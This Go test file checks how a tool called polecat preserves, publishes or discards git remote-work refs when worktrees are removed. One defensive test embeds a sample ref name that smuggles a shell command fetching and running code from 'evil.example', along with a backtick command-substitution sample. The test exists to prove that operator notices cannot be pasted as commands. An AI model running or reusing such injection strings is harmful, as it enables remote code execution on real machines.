package polecat

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/steveyegge/gastown/internal/constants"
	"github.com/steveyegge/gastown/internal/git"
)

func rwGit(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := exec.Command("git", append([]string{"-C", dir}, args...)...).CombinedOutput()
	if err != nil {
		t.Fatalf("git %v in %s: %v\n%s", args, dir, err, out)
	}
	return strings.TrimSpace(string(out))
}

// leaveRemoteWork puts the worktree in the state a remote polecat's host
// worktree is in after its worker pushed: one commit with message msg in the
// branch's work ref, and the worktree itself back at its start point.
func leaveRemoteWork(t *testing.T, clonePath, branch, msg string) string {
	t.Helper()
	sha := commitInWorktree(t, clonePath, "remote-work.txt", msg)
	rwGit(t, clonePath, "update-ref", constants.RemoteWorkRef(branch), sha)
	rwGit(t, clonePath, "reset", "-q", "--hard", "HEAD~1")
	return sha
}

func refExists(t *testing.T, dir, ref string) bool {
	t.Helper()
	return exec.Command("git", "-C", dir, "show-ref", "--verify", "--quiet", ref).Run() == nil
}

// A remote polecat's host worktree is clean and at its start point, so the
// removal guard used to see nothing to preserve and the work ref was left
// behind as the only copy. Removal now publishes it, like a local branch.
func TestRemoveWithOptions_PublishesRemoteWorkInsteadOfLosingIt(t *testing.T) {
	mgr, mayorRig := setupCanonicalBranchManagerTest(t)
	p, err := mgr.AddWithOptions("toast", AddOptions{})
	if err != nil {
		t.Fatalf("AddWithOptions: %v", err)
	}
	// The fixture's origin is the repo the worktrees belong to, where the
	// polecat branch is checked out. Publishing targets a real remote, so give
	// it one.
	origin := filepath.Join(t.TempDir(), "origin.git")
	rwGit(t, mayorRig, "clone", "-q", "--bare", mayorRig, origin)
	rwGit(t, mayorRig, "remote", "set-url", "origin", origin)
	rwGit(t, mayorRig, "fetch", "-q", "origin")
	sha := leaveRemoteWork(t, p.ClonePath, p.Branch, "work pushed by the remote worker")

	if err := mgr.RemoveWithOptions("toast", true, false, false); err != nil {
		t.Fatalf("RemoveWithOptions: %v", err)
	}
	if got := rwGit(t, origin, "rev-parse", "refs/heads/"+p.Branch); got != sha {
		t.Fatalf("origin branch %s = %s after removal, want the remote work %s", p.Branch, got, sha)
	}
	// Origin is the record now. A leftover work ref would read as unpublished
	// work again once the branch is merged and deleted from origin.
	if refExists(t, mayorRig, constants.RemoteWorkRef(p.Branch)) {
		t.Fatal("the work ref survived a removal that published it")
	}
}

func TestRemoveWithOptions_RefusesWhenRemoteWorkCannotBePublished(t *testing.T) {
	for _, tc := range []struct {
		name           string
		nuclear, broke bool
	}{
		{"origin unreachable", false, true},
		{"nuclear never publishes", true, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mgr, mayorRig := setupCanonicalBranchManagerTest(t)
			p, err := mgr.AddWithOptions("toast", AddOptions{})
			if err != nil {
				t.Fatalf("AddWithOptions: %v", err)
			}
			leaveRemoteWork(t, p.ClonePath, p.Branch, "work pushed by the remote worker")
			if tc.broke {
				breakOrigin(t, mayorRig)
			}

			err = mgr.RemoveWithOptions("toast", true, tc.nuclear, false)
			var risk *WorkAtRiskError
			if !errors.As(err, &risk) {
				t.Fatalf("RemoveWithOptions err = %v, want *WorkAtRiskError", err)
			}
			if risk.Unpushed != 1 || !strings.Contains(risk.Reason, constants.RemoteWorkRef(p.Branch)) {
				t.Errorf("risk = %d unpushed, reason %q; want 1 and the work ref named", risk.Unpushed, risk.Reason)
			}
			if _, statErr := os.Stat(p.ClonePath); statErr != nil {
				t.Fatalf("worktree was removed despite the refusal: %v", statErr)
			}
			if !refExists(t, p.ClonePath, constants.RemoteWorkRef(p.Branch)) {
				t.Fatal("the work ref was deleted despite the refusal")
			}
		})
	}
}

func TestRemoveWithOptions_DiscardUnpushedDeletesRemoteWork(t *testing.T) {
	mgr, mayorRig := setupCanonicalBranchManagerTest(t)
	p, err := mgr.AddWithOptions("toast", AddOptions{})
	if err != nil {
		t.Fatalf("AddWithOptions: %v", err)
	}
	leaveRemoteWork(t, p.ClonePath, p.Branch, "work pushed by the remote worker")
	workRef := constants.RemoteWorkRef(p.Branch)

	if err := mgr.RemoveWith("toast", RemoveOptions{Force: true, Nuclear: true, DiscardUnpushed: true}); err != nil {
		t.Fatalf("RemoveWith(DiscardUnpushed): %v", err)
	}
	if _, statErr := os.Stat(p.ClonePath); !os.IsNotExist(statErr) {
		t.Fatalf("worktree still present after an explicit discard: %v", statErr)
	}
	if refExists(t, mayorRig, workRef) {
		t.Fatalf("%s survived an explicit discard", workRef)
	}
}

// Stale-branch cleanup prunes a work ref no polecat owns once origin holds its
// commits, and keeps one that is the only copy of its work.
func TestCleanupStaleBranches_PrunesPublishedWorkRefsAndKeepsUnpublishedOnes(t *testing.T) {
	mgr, mayorRig := setupCanonicalBranchManagerTest(t)
	p, err := mgr.AddWithOptions("toast", AddOptions{})
	if err != nil {
		t.Fatalf("AddWithOptions: %v", err)
	}
	published := constants.RemoteWorkRef("polecat/ghost/gt-1@aaa")
	unpublished := constants.RemoteWorkRef("polecat/ghost/gt-2@bbb")
	owned := constants.RemoteWorkRef(p.Branch)

	rwGit(t, p.ClonePath, "update-ref", published, "origin/main")
	sha := leaveRemoteWork(t, p.ClonePath, p.Branch, "owned by a live polecat")
	rwGit(t, p.ClonePath, "update-ref", unpublished, sha)

	if _, err := mgr.CleanupStaleBranches(); err != nil {
		t.Fatalf("CleanupStaleBranches: %v", err)
	}
	if refExists(t, mayorRig, published) {
		t.Errorf("%s holds only published commits and belongs to no polecat, but was kept", published)
	}
	if !refExists(t, mayorRig, unpublished) {
		t.Errorf("%s is the only copy of its work and was deleted", unpublished)
	}
	if !refExists(t, mayorRig, owned) {
		t.Errorf("%s belongs to a live polecat and was deleted", owned)
	}
}

// With the worktree gone nothing is ever published, and an explicit discard
// has to take the work ref with it: left behind, it is reported by every
// cleanup run as work nobody can finish.
func TestRemoveWith_MissingWorktreeDiscardDeletesRemoteWork(t *testing.T) {
	f := newMissingWorktreeFixture(t, "start point", false)
	rwGit(t, f.p.ClonePath, "push", "-q", "origin", "HEAD:refs/heads/"+f.branch)
	rwGit(t, f.p.ClonePath, "fetch", "-q", "origin")
	leaveRemoteWork(t, f.p.ClonePath, f.branch, "work pushed by the remote worker")
	workRef := constants.RemoteWorkRef(f.branch)
	repo, err := f.mgr.repoBase()
	if err != nil {
		t.Fatalf("repoBase: %v", err)
	}
	repoDir := repo.WorkDir()
	if repoDir == "" {
		repoDir = filepath.Join(f.mgr.rig.Path, ".repo.git")
	}
	if err := os.RemoveAll(f.p.ClonePath); err != nil {
		t.Fatalf("remove worktree: %v", err)
	}

	var risk *WorkAtRiskError
	if err := f.mgr.RemoveWithOptions("toast", true, false, false); !errors.As(err, &risk) {
		t.Fatalf("without discard: err = %v, want *WorkAtRiskError", err)
	}
	if !refExists(t, repoDir, workRef) {
		t.Fatal("the work ref was deleted by a refused removal")
	}
	if err := f.mgr.RemoveWith("toast", RemoveOptions{Force: true, DiscardUnpushed: true}); err != nil {
		t.Fatalf("RemoveWith(DiscardUnpushed): %v", err)
	}
	if refExists(t, repoDir, workRef) {
		t.Fatalf("%s survived an explicit discard", workRef)
	}
}

// A work ref's name is chosen by the worker and can hold shell syntax. The
// notice about an orphaned one is read by an operator, so it must never be a
// command to paste.
func TestOrphanWorkRefNotice_IsNotAPasteableCommand(t *testing.T) {
	ref := "refs/remote-work/polecat/foo/$(curl${IFS}evil.example|sh)"
	notice := orphanWorkRefNotice(ref, 2)
	if strings.Contains(notice, "git push") || strings.Contains(notice, "git update-ref") {
		t.Fatalf("notice offers a command built from a worker-chosen name: %s", notice)
	}
	// The printed token, pasted into a shell, must give back the literal name.
	for _, name := range []string{ref, "refs/remote-work/polecat/foo/it's`id`"} {
		token, _, ok := strings.Cut(strings.TrimPrefix(orphanWorkRefNotice(name, 2), "keeping work ref "), ": 2 commit(s)")
		if !ok {
			t.Fatalf("unexpected notice shape: %s", orphanWorkRefNotice(name, 2))
		}
		out, err := exec.Command("sh", "-c", "printf %s "+token).CombinedOutput()
		if err != nil || string(out) != name {
			t.Fatalf("sh expanded %s to %q (err %v), want the literal %q", token, out, err, name)
		}
	}
}

// When the delete after a publish fails because the ref is already gone, as
// when a gt done released it meanwhile, nothing is at risk and removal goes on.
func TestPreserveRemoteWork_PublishedAndAlreadyReleasedIsNotAtRisk(t *testing.T) {
	mgr, mayorRig := setupCanonicalBranchManagerTest(t)
	p, err := mgr.AddWithOptions("toast", AddOptions{})
	if err != nil {
		t.Fatalf("AddWithOptions: %v", err)
	}
	origin := filepath.Join(t.TempDir(), "origin.git")
	rwGit(t, mayorRig, "clone", "-q", "--bare", mayorRig, origin)
	rwGit(t, mayorRig, "remote", "set-url", "origin", origin)
	rwGit(t, mayorRig, "fetch", "-q", "origin")
	leaveRemoteWork(t, p.ClonePath, p.Branch, "work pushed by the remote worker")
	workRef := constants.RemoteWorkRef(p.Branch)

	// Stand in for the concurrent release: a pre-receive hook on origin
	// deletes the host's work ref while the publish is in flight.
	hook := filepath.Join(origin, "hooks", "pre-receive")
	script := "#!/bin/sh\nunset GIT_DIR GIT_QUARANTINE_PATH GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES\ngit -C '" + p.ClonePath + "' update-ref -d '" + workRef + "'\n"
	if err := os.WriteFile(hook, []byte(script), 0700); err != nil {
		t.Fatal(err)
	}

	if err := mgr.RemoveWithOptions("toast", true, false, false); err != nil {
		t.Fatalf("RemoveWithOptions: %v", err)
	}
	if refExists(t, mayorRig, workRef) {
		t.Fatal("the work ref is still there")
	}
}

// The delete after a publish can fail while the ref is still there at the
// published commit (its lock is held). Origin has the work, so removal goes
// on, but the ref that stays behind is named rather than left silently.
func TestPreserveRemoteWork_PublishedRefThatCannotBeDeletedIsNamed(t *testing.T) {
	mgr, mayorRig := setupCanonicalBranchManagerTest(t)
	p, err := mgr.AddWithOptions("toast", AddOptions{})
	if err != nil {
		t.Fatalf("AddWithOptions: %v", err)
	}
	origin := filepath.Join(t.TempDir(), "origin.git")
	rwGit(t, mayorRig, "clone", "-q", "--bare", mayorRig, origin)
	rwGit(t, mayorRig, "remote", "set-url", "origin", origin)
	rwGit(t, mayorRig, "fetch", "-q", "origin")
	leaveRemoteWork(t, p.ClonePath, p.Branch, "work pushed by the remote worker")
	workRef := constants.RemoteWorkRef(p.Branch)

	// Origin's post-receive hook takes the ref's lock during the publish and
	// never releases it, so every delete that follows fails.
	common := rwGit(t, p.ClonePath, "rev-parse", "--path-format=absolute", "--git-common-dir")
	lock := filepath.Join(common, workRef+".lock")
	hook := filepath.Join(origin, "hooks", "post-receive")
	if err := os.WriteFile(hook, []byte("#!/bin/sh\n: > '"+lock+"'\n"), 0700); err != nil {
		t.Fatal(err)
	}

	stderr := captureStderr(t, func() {
		if err := mgr.RemoveWithOptions("toast", true, false, false); err != nil {
			t.Fatalf("RemoveWithOptions: %v", err)
		}
	})
	if err := os.Remove(lock); err != nil {
		t.Fatalf("the lock the hook should have taken: %v", err)
	}
	if !refExists(t, mayorRig, workRef) {
		t.Fatal("the work ref was deleted although its lock was held")
	}
	if !strings.Contains(stderr, "published but could not be deleted") {
		t.Fatalf("the leftover work ref was not named; stderr: %s", stderr)
	}
}

// A worker push that lands after the publish leaves commits origin does not
// have. The delete at the published commit fails, and removal is refused.
func TestPreserveRemoteWork_WorkerPushDuringPublishIsRefused(t *testing.T) {
	mgr, mayorRig := setupCanonicalBranchManagerTest(t)
	p, err := mgr.AddWithOptions("toast", AddOptions{})
	if err != nil {
		t.Fatalf("AddWithOptions: %v", err)
	}
	origin := filepath.Join(t.TempDir(), "origin.git")
	rwGit(t, mayorRig, "clone", "-q", "--bare", mayorRig, origin)
	rwGit(t, mayorRig, "remote", "set-url", "origin", origin)
	rwGit(t, mayorRig, "fetch", "-q", "origin")
	leaveRemoteWork(t, p.ClonePath, p.Branch, "work pushed by the remote worker")
	workRef := constants.RemoteWorkRef(p.Branch)

	// Stand in for the worker: while the publish is in flight, origin's
	// pre-receive hook moves the host's work ref on by one commit.
	later := rwGit(t, p.ClonePath, "commit-tree", "-p", workRef, "-m", "pushed during the publish", workRef+"^{tree}")
	hook := filepath.Join(origin, "hooks", "pre-receive")
	script := "#!/bin/sh\nunset GIT_DIR GIT_QUARANTINE_PATH GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES\ngit -C '" + p.ClonePath + "' update-ref '" + workRef + "' " + later + "\n"
	if err := os.WriteFile(hook, []byte(script), 0700); err != nil {
		t.Fatal(err)
	}

	err = mgr.RemoveWithOptions("toast", true, false, false)
	var risk *WorkAtRiskError
	if !errors.As(err, &risk) {
		t.Fatalf("RemoveWithOptions err = %v, want *WorkAtRiskError", err)
	}
	if risk.Unpushed != 1 || !strings.Contains(risk.Reason, "moved") {
		t.Errorf("risk = %d unpushed, reason %q; want the 1 later commit and the ref reported as moved", risk.Unpushed, risk.Reason)
	}
	if got := rwGit(t, mayorRig, "rev-parse", workRef); got != later {
		t.Fatalf("work ref = %s, want the later commit %s kept", got, later)
	}
}

// gt done can publish the work ref without releasing it (a failed merge
// request, an interrupted run). Removing the polecat then finds nothing
// unpublished, and must still take the ref with it.
func TestRemoveWithOptions_DeletesAWorkRefOriginAlreadyHolds(t *testing.T) {
	for _, missingWorktree := range []bool{false, true} {
		name := "worktree present"
		if missingWorktree {
			name = "worktree missing"
		}
		t.Run(name, func(t *testing.T) {
			f := newMissingWorktreeFixture(t, "start point", false)
			rwGit(t, f.p.ClonePath, "push", "-q", "origin", "HEAD:refs/heads/"+f.branch)
			sha := leaveRemoteWork(t, f.p.ClonePath, f.branch, "work pushed by the remote worker")
			workRef := constants.RemoteWorkRef(f.branch)
			rwGit(t, f.p.ClonePath, "push", "-q", "origin", sha+":refs/heads/"+f.branch)
			rwGit(t, f.p.ClonePath, "fetch", "-q", "origin")
			common := rwGit(t, f.p.ClonePath, "rev-parse", "--path-format=absolute", "--git-common-dir")
			if missingWorktree {
				if err := os.RemoveAll(f.p.ClonePath); err != nil {
					t.Fatalf("remove worktree: %v", err)
				}
			}

			if err := f.mgr.RemoveWithOptions("toast", true, false, false); err != nil {
				t.Fatalf("RemoveWithOptions: %v", err)
			}
			if exec.Command("git", "--git-dir", common, "show-ref", "--verify", "--quiet", workRef).Run() == nil {
				t.Fatalf("%s survived the removal although origin holds it", workRef)
			}
		})
	}
}

// The ref is examined, found fully published, and then deleted. A worker push
// that lands between the two leaves commits origin does not have: the delete
// at the examined commit fails, and the later commits are reported, not
// passed over as a ref that merely could not be deleted.
func TestReleasePublishedWorkRef_WorkerPushAfterTheExaminationIsReported(t *testing.T) {
	f := newMissingWorktreeFixture(t, "start point", false)
	rwGit(t, f.p.ClonePath, "push", "-q", "origin", "HEAD:refs/heads/"+f.branch)
	sha := leaveRemoteWork(t, f.p.ClonePath, f.branch, "work pushed by the remote worker")
	workRef := constants.RemoteWorkRef(f.branch)
	rwGit(t, f.p.ClonePath, "push", "-q", "origin", sha+":refs/heads/"+f.branch)
	rwGit(t, f.p.ClonePath, "fetch", "-q", "origin")
	g := git.NewGit(f.p.ClonePath)
	examined, err := g.UnpublishedRemoteWork(f.branch, "origin")
	if err != nil || examined.Tip != sha || examined.Unpublished != 0 {
		t.Fatalf("examined = %+v, %v; want the published tip %s", examined, err, sha)
	}
	// The worker pushes one more commit after the examination.
	later := rwGit(t, f.p.ClonePath, "commit-tree", "-p", workRef, "-m", "pushed after the examination", workRef+"^{tree}")
	rwGit(t, f.p.ClonePath, "update-ref", workRef, later)

	var after git.RemoteWork
	stderr := captureStderr(t, func() {
		after, err = releasePublishedWorkRef(g, f.branch, examined)
	})
	if err != nil {
		t.Fatalf("releasePublishedWorkRef: %v", err)
	}
	if after.Unpublished != 1 || after.Tip != later {
		t.Errorf("after = %+v, want the 1 later commit at %s", after, later)
	}
	if strings.Contains(stderr, "published but could not be deleted") {
		t.Errorf("the moved ref was reported as published: %s", stderr)
	}
	if got := rwGit(t, f.p.ClonePath, "rev-parse", workRef); got != later {
		t.Fatalf("work ref = %s, want the later commit %s kept", got, later)
	}
}

// The same push with the worktree gone: removal is refused for the commits
// that arrived, and the ref keeps them.
func TestRemoveWithOptions_MissingWorktreeWorkerPushDuringReleaseIsRefused(t *testing.T) {
	f := newMissingWorktreeFixture(t, "start point", false)
	rwGit(t, f.p.ClonePath, "push", "-q", "origin", "HEAD:refs/heads/"+f.branch)
	sha := leaveRemoteWork(t, f.p.ClonePath, f.branch, "work pushed by the remote worker")
	workRef := constants.RemoteWorkRef(f.branch)
	rwGit(t, f.p.ClonePath, "push", "-q", "origin", sha+":refs/heads/"+f.branch)
	rwGit(t, f.p.ClonePath, "fetch", "-q", "origin")
	later := rwGit(t, f.p.ClonePath, "commit-tree", "-p", workRef, "-m", "pushed after the examination", workRef+"^{tree}")
	common := rwGit(t, f.p.ClonePath, "rev-parse", "--path-format=absolute", "--git-common-dir")
	hooks := rwGit(t, f.p.ClonePath, "rev-parse", "--path-format=absolute", "--git-path", "hooks")

	// Stand in for the worker: the repo's reference-transaction hook rejects
	// the first delete of the work ref and, once that transaction is aborted
	// and the ref unlocked, moves the ref on by one commit.
	marker := filepath.Join(t.TempDir(), "rejected")
	script := "#!/bin/sh\n" +
		"if [ \"$1\" = prepared ] && [ ! -e '" + marker + "' ] && grep -q '^" + sha + " 0\\{40\\} " + workRef + "$'; then\n" +
		"  : > '" + marker + "'; exit 1\nfi\n" +
		"if [ \"$1\" = aborted ] && [ -e '" + marker + "' ] && [ ! -e '" + marker + ".moved' ]; then\n" +
		"  : > '" + marker + ".moved'; git update-ref '" + workRef + "' " + later + " " + sha + "\nfi\nexit 0\n"
	if err := os.MkdirAll(hooks, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(hooks, "reference-transaction"), []byte(script), 0700); err != nil {
		t.Fatal(err)
	}
	if err := os.RemoveAll(f.p.ClonePath); err != nil {
		t.Fatalf("remove worktree: %v", err)
	}

	err := f.mgr.RemoveWithOptions("toast", true, false, false)
	var risk *WorkAtRiskError
	if !errors.As(err, &risk) {
		t.Fatalf("RemoveWithOptions err = %v, want *WorkAtRiskError", err)
	}
	if risk.Unpushed != 1 {
		t.Errorf("risk.Unpushed = %d, want the 1 later commit", risk.Unpushed)
	}
	out, revErr := exec.Command("git", "--git-dir", common, "rev-parse", workRef).Output()
	if got := strings.TrimSpace(string(out)); revErr != nil || got != later {
		t.Fatalf("work ref = %q (%v), want the later commit %s kept", got, revErr, later)
	}
}
